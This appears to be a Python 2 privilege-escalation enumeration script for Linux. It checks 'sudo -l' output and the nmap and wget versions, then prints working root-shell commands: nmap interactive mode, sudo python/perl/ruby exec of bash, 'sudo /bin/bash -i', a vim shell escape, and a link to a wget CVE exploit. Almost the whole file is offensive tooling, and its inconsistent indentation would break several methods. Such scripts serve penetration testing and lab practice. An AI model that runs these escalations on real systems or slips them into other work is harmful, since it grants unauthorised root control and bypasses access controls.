#!/usr/bin/env python2
import subprocess

def shell(comm):
	s = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	return s.stdout.read(), s.stderr.read()

class colors:
    purple = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'
exploits = []
class ZTR:
	def __init__(self):
		self.exploits = []
		pass #initalize object
	@classmethod
	def OldNmap(self):
		print(colors.blue + "[I] Checking for exploitable nmap version.." + colors.end)
		out, err = shell('nmap -V | grep version')
		if '3.8' in out or '3.8' in err:
			print(colors.green + "[#] Exploitable Nmap Version found!" + colors.end)
			exploit = colors.yellow  + "echo !sh | nmap --interactive" + colors.end
			exploits.append(exploit)
	@classmethod
	def SudoPython(self):
		print(colors.blue + "[I] Checking for privilige escalation via Python.." + colors.end)
		out, err = shell('sudo -l')
		if 'python' in out or 'python' in err or "ALL" in out or "ALL" in err:
			print(colors.green + "[#] Privilige Escalation is possible with python!" + colors.end)
			exploit = colors.yellow + """sudo python -c 'import pty;pty.spawn("/bin/bash")'""" + colors.end
			exploits.append(exploit)

		else:
			print(colors.red + """[?] Exploit failed, please check it manually by doing the following:\nsudo -l\nIf you see python ANYWHERE in the output,\nprivilige escalation is possible via the following command:\nsudo python -c 'import pty;pty.spawn("/bin/bash")'""")
	@classmethod
	def SudoPerl(self):
		print(colors.blue + "[I] Checking for privilige escalation via Perl.." + colors.end)
                out, err = shell('sudo -l')
                if 'perl' in out or 'perl' in err or "ALL" in out or "ALL" in err:
                        print(colors.green + "[#] Privilige Escalation is possible with perl!" + colors.end)
			comm = """sudo perl -e 'exec "/bin/bash"'"""
                        exploit = colors.yellow + comm + colors.end
                        exploits.append(exploit)
		else:
			print(colors.red + """[?] Exploit failed, please check it manually by doing the following:\nsudo -l\nIf you see perl ANYWHERE in the output,\nprivilige escalation is possible via the following command:\nsudo perl -e 'exec "/bin/bash"'""")
	@classmethod
	def SudoRuby(self):
		print(colors.blue + "[I] Checking for privilige escalation via Ruby.." + colors.end)
                out, err = shell('sudo -l')
                if 'ruby' in out or 'ruby' in err or "ALL" in out or "ALL" in err:
                        print(colors.green + "[#] Privilige Escalation is possible with ruby!" + colors.end)
                        comm = """sudo ruby -e 'exec "/bin/bash"'"""
                        exploit = colors.yellow + comm + colors.end
                        exploits.append(exploit)
                else:
			print(colors.red + """[?] Exploit failed, please check it manually by doing the following:\nsudo -l\nIf you see ruby ANYWHERE in the output,\nprivilige escalation is possible via the following command:\nsudo ruby -e 'exec "/bin/bash"'""")
	@classmethod
	def SudoBash(self):
		print(colors.blue + "[I] Checking for privilige escalation via Bash.." + colors.end)
		comm = "sudo /bin/bash -i"
		out, err = shell('sudo -l')
		if 'sh' in out[5:] or 'sh' in err[5:] or "ALL" in out[5:] or "ALL" in err[5:]:
			print(colors.green + "[#] Privilige Escalation is possible with Bash!" + colors.end)
			exploit = colors.yellow + comm + colors.end
			exploits.append(exploit)

	@classmethod
	def OldWget(self):
		print(colors.blue + "[I] Checking for privilige escalation via GNU Wget.." + colors.end)
		cve = "https://www.exploit-db.com/exploits/40064"
		comm = "wget -h | grep GNU"
		out, err = shell(comm)
		if float(out[8:13]) < 1.18:
			print out[8:13]
			print(colors.green + "[#] Privilige Escalation is possible with CVE-2016-4971! " + colors.end)
                        exploit = colors.yellow + cve + colors.end
                        exploits.append(exploit)
	@classmethod
	def VimEscalation(self):
		print(colors.blue + "[I] Checking for privilige escalation via Vim.." + colors.end)
		comm = "sudo -l"
		out, err = shell(comm)
		if 'vim' in out or 'vim' in err or 'ALL' in out or 'ALL' in err:
			print(colors.green + "[#] Privilige Escalation is possible with Vim!" + colors.end)
			exploit = colors.yellow + "sudo vim RANDOM.txt (Then hit : and type in !bash)" + colors.end
			exploits.append(exploit)
ZTR.OldNmap()
ZTR.SudoBash()
ZTR.SudoPython()
ZTR.SudoPerl()
ZTR.SudoRuby()
ZTR.OldWget()
ZTR.VimEscalation()
if len(exploits) == 0:
	print(colors.purple + "[:(] No exploits found for this system." + colors.end)
else:
	print(colors.purple + "[*] Exploits found: {}".format(len(exploits)))
	for exploit in exploits:
		print(colors.purple + "[#] Exploit: {}".format(exploit) + colors.end)
